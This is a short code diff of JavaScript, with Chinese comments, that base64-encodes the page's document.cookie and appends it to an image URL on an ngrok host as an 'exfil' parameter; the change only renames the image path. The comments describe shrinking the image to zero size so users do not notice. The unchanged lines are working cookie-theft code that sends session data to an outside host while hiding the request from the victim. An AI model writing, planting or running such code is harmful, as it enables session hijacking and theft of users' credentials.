@@ -11,7 +11,7 @@
             // 將敏感資料（如 Cookie）進行 Base64 編碼，附加在圖片請求的參數中
             const b64_data = btoa(unescape(encodeURIComponent(document.cookie || "no-cookie")));
             
-            leak.src = 'https://chanceful-tova-mercuric.ngrok-free.dev/pixel.png?exfil=' + b64_data;
+            leak.src = 'https://chanceful-tova-mercuric.ngrok-free.dev/test.jpeg?exfil=' + b64_data;
             
             // 為了不讓使用者發現，可以將圖片大小設為 0
             leak.width = 0;
